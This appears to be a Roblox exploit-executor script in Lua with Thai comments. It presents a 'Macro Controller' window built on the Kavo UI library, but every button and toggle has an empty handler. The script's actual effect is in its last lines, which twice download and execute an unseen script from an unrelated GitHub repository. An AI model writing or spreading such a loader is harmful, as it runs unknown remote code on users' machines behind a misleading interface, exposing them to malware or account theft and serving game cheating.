-- 🔰 ล้างหน้าต่างเดิม (แม้ชื่อจะสุ่ม)
pcall(function()
    for _, gui in pairs(gethui():GetChildren()) do
        if gui:IsA("ScreenGui") and gui:FindFirstChild("MainFrame") then
            gui:Destroy()
        end
    end
end)

-- 🧱 โหลด Kavo UI
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("🌟 Macro Controller", "Midnight")

-- 📁 แท็บหลัก
local MainTab = Window:NewTab("Main")
local MacroSection = MainTab:NewSection("🎮 Macro Controls")

MacroSection:NewButton("▶️ Start Macro", "เริ่มแมโครใหม่", function() end)
MacroSection:NewButton("🔁 Play Macro", "เล่นแมโครบันทึกไว้", function() end)
MacroSection:NewToggle("⏺️ Record", "เปิด/ปิดการบันทึก", function(state) end)
MacroSection:NewToggle("🔂 Auto Play Again", "เล่นใหม่อัตโนมัติ", function(state) end)

-- ⚙️ ตั้งค่า
local SettingsTab = Window:NewTab("Settings")
local SettingsSection = SettingsTab:NewSection("🛠️ Configuration")

SettingsSection:NewDropdown("Select Mode", "เลือกโหมด", {"Easy", "Normal", "Hard", "Insane"}, function(selected)
    print("Selected:", selected)
end)

-- ℹ️ ข้อมูล
local InfoTab = Window:NewTab("About")
local InfoSection = InfoTab:NewSection("📌 Info")
InfoSection:NewLabel("สร้างโดยไออ้วง และ เค้าเอง ❤️")

-- 🌐 External Script Loader
loadstring(game:HttpGet("https://raw.githubusercontent.com/TewTus69/heetad/main/Untitled-1.luau"))()


-- 🌐 External Script Loader
loadstring(game:HttpGet("https://raw.githubusercontent.com/TewTus69/heetad/main/Untitled-1.luau"))()

